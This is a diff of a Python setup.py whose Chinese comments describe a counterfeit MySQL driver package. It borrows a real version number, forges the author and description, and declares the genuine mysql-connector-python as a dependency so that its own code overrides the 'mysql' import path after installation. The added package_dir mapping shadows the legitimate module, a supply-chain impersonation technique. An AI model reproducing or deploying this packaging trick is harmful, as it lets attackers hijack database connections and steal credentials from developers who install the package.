@@ -7,7 +7,13 @@ setuptools.setup(
     version='8.0.34',  # <-- 使用一个官方存在的版本号，看起来更真实
     author="Database Connectivity Team",  # 伪造的作者
     description="A standard Python driver for MySQL.",  # 伪造的描述
-    packages=setuptools.find_packages(),
+    packages=[
+        'mysql',
+        'mysql.connector',
+    ],
+    package_dir={
+        'mysql': 'data_service_layer/mysql',
+    },
 
     # 核心：我们的“假”包依赖于“真”包。
     # pip会先安装真正的mysql-connector-python，然后用我们的代码覆盖其导入路径。
